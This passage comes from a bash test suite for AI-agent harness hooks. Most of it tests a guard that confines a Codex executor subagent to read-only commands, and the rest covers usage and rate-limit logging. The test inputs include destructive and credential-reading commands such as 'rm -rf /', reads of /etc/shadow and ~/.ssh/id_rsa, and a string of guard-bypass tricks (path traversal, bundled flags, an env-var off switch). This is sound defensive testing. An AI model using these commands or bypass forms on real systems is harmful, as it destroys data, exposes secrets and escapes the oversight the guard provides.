  "stash subverb not in read-only allowlist"

run_case "cx: git stash pop → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash pop"}}' \
  "stash subverb not in read-only allowlist"

run_case "cx: git stash clear → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash clear"}}' \
  "stash subverb not in read-only allowlist"

run_case "cx: git stash apply → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash apply"}}' \
  "stash subverb not in read-only allowlist"

# --- security: --output / --out-file flag rejection (NEW v3) ---
run_case "cx: git log --output=/tmp/x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git log --output=/tmp/x"}}' \
  "git write flag"

run_case "cx: git diff --output=/tmp/x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git diff --output=/tmp/x"}}' \
  "git write flag"

run_case "cx: git show --output=/tmp/x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git show --output=/tmp/x"}}' \
  "git write flag"

# --- security: unsupported git option forms (NEW v3) ---
run_case "cx: git -c key=val status → deny (unsupported form)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -c key=val status"}}' \
  "unsupported git form"

run_case "cx: git --git-dir=foo status → deny (unsupported form)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git --git-dir=/tmp/x status"}}' \
  "unsupported git form"

# --- security: dangerous binaries off allowlist ---
run_case "cx: find . -delete → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"find . -delete"}}' \
  "not in allowlist"

run_case "cx: find . -name foo → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"find . -name foo"}}' \
  "not in allowlist"

run_case "cx: bash -c → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"bash -c whatever"}}' \
  "not in allowlist"

run_case "cx: sed -i → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"sed -i s/a/b/ file"}}' \
  "not in allowlist"

run_case "cx: awk script → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"awk -f script.awk file"}}' \
  "not in allowlist"

run_case "cx: env FOO=x git status → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"env FOO=x git status"}}' \
  "not in allowlist"

run_case "cx: codex exec direct → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"codex exec foo"}}' \
  "not in allowlist"

# --- empty / malformed ---
run_case "cx: empty command → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":""}}' \
  "empty"

run_case "cx: malformed JSON → deny" 2 "$CXHOOK" \
  'not json' \
  "malformed JSON"

# --- type confusion ---
run_case "cx: agent_type as array → no-op" 0 "$CXHOOK" \
  '{"agent_type":["codex-executor"],"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: agent_type null → no-op" 0 "$CXHOOK" \
  '{"agent_type":null,"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

# --- no-op for non-target agents/tools ---
run_case "cx: critic Bash → no-op" 0 "$CXHOOK" \
  '{"agent_type":"critic","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: project-pm Bash → no-op (other guard)" 0 "$CXHOOK" \
  '{"agent_type":"project-pm","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: main thread (no agent_type) → no-op" 0 "$CXHOOK" \
  '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: codex-executor Read → no-op" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Read","tool_input":{"file_path":"/tmp/x"}}'

# --- bypass env var ---
run_case_env "cx: bypass via CLAUDE_HOOK_CODEX_GUARD=off" 0 "CLAUDE_HOOK_CODEX_GUARD=off" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case_env "cx: bypass=Off (case mismatch) does NOT bypass" 2 "CLAUDE_HOOK_CODEX_GUARD=Off" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case_env "cx: bypass=empty does NOT bypass" 2 "CLAUDE_HOOK_CODEX_GUARD=" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

# --- audit-log content assertions ---
truncate_log
printf '%s' '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status"}}' | "$CXHOOK" >/dev/null 2>&1
assert_log "cx: audit log contains allow line" "decision=allow"
# %q escapes spaces as backslash-space; assert the escaped form.
assert_log "cx: allow line records git command (escaped)" 'git\ status'

truncate_log
printf '%s' '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git push --force"}}' | "$CXHOOK" >/dev/null 2>&1
assert_log "cx: audit log contains deny line" "decision=deny"
assert_log "cx: deny line records command target (escaped)" 'git\ push\ --force'

truncate_log
printf '%s' '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status; rm -rf /"}}' | "$CXHOOK" >/dev/null 2>&1
# Reason is also %q-escaped; the literal `shell` token survives unescaped.
assert_log "cx: deny reason includes 'shell metacharacter'" 'shell\ metacharacter'

truncate_log
printf '%s' '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status"}}' | env CLAUDE_HOOK_CODEX_GUARD=off CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$CXHOOK" >/dev/null 2>&1
assert_log "cx: audit log contains bypass line with agent_type" "decision=bypass"
assert_log "cx: bypass line records codex-executor (not '?')" "agent=codex-executor"

# --- read-root override via env var ---
run_case_env "cx: cat /etc/x with /etc in read roots → allow" 0 "CLAUDE_HOOK_CODEX_READ_ROOTS=/etc" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /etc/passwd"}}'

# --- v4: quoted-path bypass ---
run_case 'cx: cat "/etc/passwd" (double-quote) → deny' 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat \"/etc/passwd\""}}' \
  "double-quote"

run_case "cx: cat '/etc/passwd' (single-quote) → deny" 2 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"cat '/etc/passwd'\"}}" \
  "single-quote"

run_case 'cx: grep "pattern" file (any double-quote) → deny' 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep \"pattern\" file"}}' \
  "double-quote"

# --- v4: relative `..` traversal bypass ---
run_case "cx: cat ../etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat ../etc/passwd"}}' \
  "path traversal"

run_case "cx: cat ../../etc/shadow → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat ../../etc/shadow"}}' \
  "path traversal"

run_case "cx: cat ./../etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat ./../etc/passwd"}}' \
  "path traversal"

run_case "cx: cat foo/../bar → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat foo/../bar"}}' \
  "path traversal"

run_case "cx: legitimate filename foo..bar → allow (not path segment)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat foo..bar"}}'

# --- v4: git -C dir read-root validation ---
run_case "cx: git -C /etc status → deny (outside read roots)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /etc status"}}' \
  "git -C dir outside read roots"

run_case "cx: git -C /home/example/.ssh status → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /home/example/.ssh status"}}' \
  "git -C dir outside read roots"

run_case "cx: git -C /tmp/../etc status → deny (traversal normalizes)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /tmp/../etc status"}}' \
  "path traversal"

run_case "cx: git -C ../foo status → deny (relative traversal)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C ../foo status"}}' \
  "path traversal"

# --- v4: --flag=PATH bypass ---
run_case "cx: grep --file=/etc/shadow x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file=/etc/shadow x"}}' \
  "outside read roots"

run_case "cx: jq --slurpfile=/etc/passwd . → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"jq --slurpfile=/etc/passwd ."}}' \
  "outside read roots"

run_case "cx: cat --include=/tmp/foo file → allow (value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat --include=/tmp/foo file"}}'

run_case "cx: grep --file=~/.ssh/x file → deny (tilde in flag value)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file=~/.ssh/x file"}}' \
  "tilde path"

run_case "cx: grep --file=/tmp/../etc/passwd → deny (traversal in flag value)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file=/tmp/../etc/passwd file"}}' \
  "path traversal"

# --- v5: short-flag bypass (single-dash with =, bundled with attached path) ---
run_case "cx: grep -f=/etc/shadow x → deny (short flag with =)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f=/etc/shadow x"}}' \
  "outside read roots"

run_case "cx: grep -f/etc/shadow x → deny (bundled short flag, abs path)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f/etc/shadow x"}}' \
  "outside read roots"

run_case "cx: grep -f~/.ssh/id_rsa x → deny (bundled short flag, tilde)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f~/.ssh/id_rsa x"}}' \
  "tilde path"

run_case "cx: grep -f../etc/passwd x → deny (bundled short flag, traversal)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f../etc/passwd x"}}' \
  "path traversal"

run_case "cx: grep -f/tmp/foo x → allow (bundled short flag, value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -f/tmp/foo x"}}'

run_case "cx: grep -i pattern → allow (bare short flag, no value)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -i pattern file"}}'

run_case "cx: grep -iE pattern → allow (combined short flags, not path)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -iE pattern file"}}'

# --- v6: bundled-prefix short-flag bypass (-rf/etc/passwd) ---
run_case "cx: grep -rf/etc/passwd → deny (bundled prefix + path)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -rf/etc/passwd /tmp/x"}}' \
  "outside read roots"

run_case "cx: grep -irf/etc/shadow → deny (multi-prefix + path)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -irf/etc/shadow /tmp/x"}}' \
  "outside read roots"

run_case "cx: grep -nf/etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -nf/etc/passwd /tmp/x"}}' \
  "outside read roots"

run_case "cx: jq -rf/etc/passwd → deny (filter from secret file)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"jq -rf/etc/passwd /tmp/in"}}' \
  "outside read roots"

run_case "cx: grep -rf~/.ssh/x → deny (bundled prefix + tilde)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -rf~/.ssh/x /tmp/x"}}' \
  "tilde path"

run_case "cx: grep -rf../etc/passwd → deny (bundled prefix + traversal)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -rf../etc/passwd /tmp/x"}}' \
  "path traversal"

run_case "cx: grep -rf/tmp/foo → allow (bundled prefix, value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -rf/tmp/foo /tmp/x"}}'

run_case "cx: grep -rfsomefile → allow (bundled prefix, no path shape)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -rfsomefile /tmp/x"}}'

# --- v7: digit-prefix bundled bypass ---
run_case "cx: tail -n5/etc/passwd → deny (digit prefix + path)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -n5/etc/passwd"}}' \
  "outside read roots"

run_case "cx: head -c100/etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"head -c100/etc/passwd"}}' \
  "outside read roots"

run_case "cx: grep -A2/etc/passwd x → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep -A2/etc/passwd x"}}' \
  "outside read roots"

run_case "cx: tail -n5/tmp/foo → allow (digit prefix, value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -n5/tmp/foo"}}'

run_case "cx: tail -n5 → allow (digit prefix, no path)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -n5 file"}}'

# --- v8: digit-only short flag (legacy obsolete `tail -N` form) ---
run_case "cx: tail -5/etc/passwd → deny (digit-only entry + path)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -5/etc/passwd"}}' \
  "outside read roots"

run_case "cx: head -5/etc/passwd → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"head -5/etc/passwd"}}' \
  "outside read roots"

run_case "cx: tail -15/etc/passwd → deny (multi-digit entry + path)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -15/etc/passwd"}}' \
  "outside read roots"

run_case "cx: tail -5/tmp/foo → allow (digit-only entry, value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -5/tmp/foo"}}'

run_case "cx: tail -5 file → allow (digit-only flag, no path)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"tail -5 file"}}'

# --- v5: --flag VALUE space form (positional validation on next iter) ---
run_case "cx: grep --file /etc/shadow x → deny (space form; value as positional)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file /etc/shadow x"}}' \
  "outside read roots"

run_case "cx: grep --file /tmp/foo x → allow (space form; value under read root)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"grep --file /tmp/foo x"}}'

# Mutation-sensitive: distinguishes branch flag-gate (not the array entry).
run_case "cx: git branch -d foo → deny (gate enforces destructive flag)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -d foo"}}' \
  "destructive/mutating flag"

# --- v4: dead-code regression (stash/branch removed from array) ---
# These would silently pass if the per-subcmd gates were also removed;
# combined with the explicit deny tests above, mutation testing is now strict.
run_case "cx: git status (still allowed via array)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status --short"}}'

run_case "cx: git branch -a (only branch gate sets allowed=1 now)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -a"}}'

run_case "cx: git stash list (only stash gate sets allowed=1 now)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git stash list"}}'

# --- run_in_background:true deny path ---------------------------------------
# The hook denies `run_in_background:true` because backgrounding the
# codex-dispatch.sh call from inside the codex-executor subagent orphans the
# codex job (subagent process dies when its Bash returns; harness SIGKILLs the
# orphaned background command). See codex-executor.md §Dispatch.
#
# The harness payload shape for the `run_in_background` flag is undocumented;
# the hook hedges across three plausible JSON paths. EVERY path must have a
# regression test — a prior single-path fix shipped without tests was bypassed
# in production (see DEBUG comment in hook-codex-bash-guard.sh).

# Path 1 of 3: nested under tool_input.
run_case "cx: run_in_background:true in tool_input → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status","run_in_background":true}}' \
  "run_in_background:true forbidden"

# Path 2 of 3: top-level envelope sibling of tool_input.
run_case "cx: run_in_background:true at top level → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","run_in_background":true,"tool_input":{"command":"git status"}}' \
  "run_in_background:true forbidden"

# Path 3 of 3: nested under tool_options.
run_case "cx: run_in_background:true in tool_options → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_options":{"run_in_background":true},"tool_input":{"command":"git status"}}' \
  "run_in_background:true forbidden"

# Allow: explicit false should never trigger the deny.
run_case "cx: run_in_background:false in tool_input → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status","run_in_background":false}}'

# Allow: field absent (the common case) should never trigger the deny.
run_case "cx: run_in_background field absent → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status"}}'

# Bypass: CLAUDE_HOOK_CODEX_GUARD=off must skip the new check (consistent with
# the bypass behaviour for all other guard checks in this hook).
run_case_env "cx: bypass CLAUDE_HOOK_CODEX_GUARD=off with run_in_background:true → allow" 0 \
  "CLAUDE_HOOK_CODEX_GUARD=off" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status","run_in_background":true}}'

# Narrowness: only an exact boolean true (jq -r "true") triggers — string "yes",
# numeric 1, mixed-case "TRUE" are NOT denied. Documents the intentional
# scope of the check; a future widening would require an explicit decision.
run_case "cx: run_in_background:\"yes\" (string) → allow (only boolean true denied)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status","run_in_background":"yes"}}'

run_case "cx: run_in_background:1 (numeric) → allow (only boolean true denied)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status","run_in_background":1}}'

# Negative: non-codex-executor agents are unaffected by the run_in_background
# check (and indeed by the entire hook — it no-ops for other agent types).
run_case "cx: main thread (no agent_type) with run_in_background:true → no-op allow" 0 "$CXHOOK" \
  '{"tool_name":"Bash","tool_input":{"command":"git status","run_in_background":true}}'

# =============================================================================
# hook-log-claude-usage
# =============================================================================

echo
$LIST || echo "== hook-log-claude-usage =="
truncate_log

stop_happy_path() {
  local name="stop_happy_path" home transcript payload out err status logfile
  should_run "$name" || return 0
  home="$(make_stop_home)"
  transcript="$home/transcript.jsonl"
  printf '%s\n' \
    '{"role":"assistant","usage":{"input_tokens":1000,"output_tokens":200}}' \
    '{"role":"user","usage":{"input_tokens":500,"output_tokens":0}}' \
    > "$transcript"
  payload="$(jq -nc --arg path "$transcript" --arg session "sess1" '{transcript_path:$path,session_id:$session}')"
  out="$(mktemp)"
  err="$(mktemp)"
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >"$out" 2>"$err"
  status=$?
  logfile="$home/.claude/usage-tracker.jsonl"
  if [[ "$status" == "0" && -f "$logfile" ]] &&
     grep -q -F '"type":"session_total"' "$logfile" &&
     grep -q -F '"tokens":1700' "$logfile"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s, logfile=%s)\n' "$name" "$status" "$logfile"
  fi
  rm -f "$out" "$err"
}

stop_missing_transcript_path() {
  local name="stop_missing_transcript_path" home status
  should_run "$name" || return 0
  home="$(make_stop_home)"
  printf '%s' '{"session_id":"s1"}' | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  if [[ "$status" == "0" && ! -f "$home/.claude/usage-tracker.jsonl" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s)\n' "$name" "$status"
  fi
}

stop_transcript_file_not_found() {
  local name="stop_transcript_file_not_found" home status
  should_run "$name" || return 0
  home="$(make_stop_home)"
  printf '%s' '{"transcript_path":"/nonexistent/path","session_id":"s1"}' | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  if [[ "$status" == "0" && ! -f "$home/.claude/usage-tracker.jsonl" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s)\n' "$name" "$status"
  fi
}

stop_malformed_json_payload() {
  local name="stop_malformed_json_payload" home status
  should_run "$name" || return 0
  home="$(make_stop_home)"
  printf '%s' 'not json' | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  if [[ "$status" == "0" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s)\n' "$name" "$status"
  fi
}

stop_zero_token_transcript() {
  local name="stop_zero_token_transcript" home transcript payload status
  should_run "$name" || return 0
  home="$(make_stop_home)"
  transcript="$home/transcript-zero.jsonl"
  printf '%s\n' '{"role":"assistant","content":"hello"}' '{"role":"user","content":"ok"}' > "$transcript"
  payload="$(jq -nc --arg path "$transcript" --arg session "s1" '{transcript_path:$path,session_id:$session}')"
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  if [[ "$status" == "0" && ! -f "$home/.claude/usage-tracker.jsonl" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s)\n' "$name" "$status"
  fi
}

stop_failure_logged() {
  local name="stop_failure_logged" home transcript payload status logfile
  should_run "$name" || return 0
  home="$(make_stop_home)"
  transcript="$home/transcript-fail.jsonl"
  printf '%s\n' '{"role":"assistant","usage":{"input_tokens":1000,"output_tokens":200}}' > "$transcript"
  logfile="$home/.claude/usage-tracker.jsonl"
  : > "$logfile"
  chmod 444 "$logfile"
  payload="$(jq -nc --arg path "$transcript" --arg session "s1" '{transcript_path:$path,session_id:$session}')"
  truncate_log
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  chmod 644 "$logfile"
  if [[ "$status" == "0" && -f "$TEST_LOG_FILE" ]] && grep -q -F "failed" "$TEST_LOG_FILE"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s, hooks.log missing failure)\n' "$name" "$status"
  fi
}

stop_idempotent_double_call() {
  local name="stop_idempotent_double_call" home transcript payload status logfile total
  should_run "$name" || return 0
  home="$(make_stop_home)"
  transcript="$home/transcript-idem.jsonl"
  printf '%s\n' \
    '{"role":"assistant","usage":{"input_tokens":1000,"output_tokens":200}}' \
    '{"role":"user","usage":{"input_tokens":500,"output_tokens":0}}' \
    > "$transcript"
  payload="$(jq -nc --arg path "$transcript" --arg session "sess-idem" \
    '{transcript_path:$path,session_id:$session}')"
  # First invocation
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  # Second invocation (same session + transcript)
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  logfile="$home/.claude/usage-tracker.jsonl"
  # Sum all session_total entries for this session - must equal 1700, not 3400
  total=$(python3 -c "
import json
total = 0
for line in open('$logfile'):
    try:
        e = json.loads(line.strip())
        if e.get('type') == 'session_total':
            total += e.get('tokens', 0)
    except: pass
print(total)
" 2>/dev/null || echo 0)
  if [[ "$status" == "0" && "$total" == "1700" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s, total=%s, expected 1700)\n' "$name" "$status" "$total"
  fi
}

stop_nested_message_usage() {
  local name="stop_nested_message_usage" home transcript payload status logfile
  should_run "$name" || return 0
  home="$(make_stop_home)"
  transcript="$home/transcript-nested.jsonl"
  # Nested format: usage is under message.usage (Claude API transcript format)
  printf '%s\n' \
    '{"role":"assistant","message":{"usage":{"input_tokens":800,"output_tokens":200}}}' \
    '{"role":"user","message":{"usage":{"input_tokens":100,"output_tokens":0}}}' \
    > "$transcript"
  payload="$(jq -nc --arg path "$transcript" --arg session "sess-nested" \
    '{transcript_path:$path,session_id:$session}')"
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  logfile="$home/.claude/usage-tracker.jsonl"
  if [[ "$status" == "0" && -f "$logfile" ]] &&
     grep -q -F '"type":"session_total"' "$logfile" &&
     grep -q -F '"tokens":1100' "$logfile"; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s, logfile=%s)\n' "$name" "$status" "$logfile"
  fi
}

stop_no_session_id_skips_log() {
  local name="stop_no_session_id_skips_log" home transcript payload status
  should_run "$name" || return 0
  home="$(make_stop_home)"
  transcript="$home/transcript-nosession.jsonl"
  printf '%s\n' \
    '{"role":"assistant","usage":{"input_tokens":1000,"output_tokens":200}}' \
    > "$transcript"
  # Payload has transcript_path but no session_id field
  payload="$(jq -nc --arg path "$transcript" '{transcript_path:$path}')"
  # Invoke twice — without session_id the hook must skip logging (cannot deduplicate)
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  printf '%s' "$payload" | HOME="$home" CLAUDE_HOOK_LOG_DIR="$CLAUDE_HOOK_LOG_DIR" "$STOP_HOOK" >/dev/null 2>&1
  status=$?
  if [[ "$status" == "0" && ! -f "$home/.claude/usage-tracker.jsonl" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (status=%s, tracker unexpectedly exists)\n' "$name" "$status"
  fi
}

stop_happy_path
stop_missing_transcript_path
stop_transcript_file_not_found
stop_malformed_json_payload
stop_zero_token_transcript
stop_failure_logged
stop_idempotent_double_call
stop_nested_message_usage
stop_no_session_id_skips_log

# =============================================================================
# hook-save-rate-limits
# =============================================================================

echo
$LIST || echo "== hook-save-rate-limits =="

run_rl_hook() {
  local json="$1" config_dir="$2"
  printf '%s' "$json" | CLAUDE_CONFIG_DIR="$config_dir" "$RL_HOOK" 2>/dev/null
}

rl_hook_happy_path() {
  # Verifies that a valid rate_limits payload writes rate-limits.json with the
  # correct five_hour, seven_day percentages, and an updated_at timestamp.
  # Steps:
  #   1. Run the hook with JSON containing five_hour (25%) and seven_day (10%)
  #   2. Assert rate-limits.json exists with correct field values and updated_at
  local name="rl-hook/happy-path-writes-file" rl_home
  should_run "$name" || return 0
  rl_home="$(mktemp -d)"
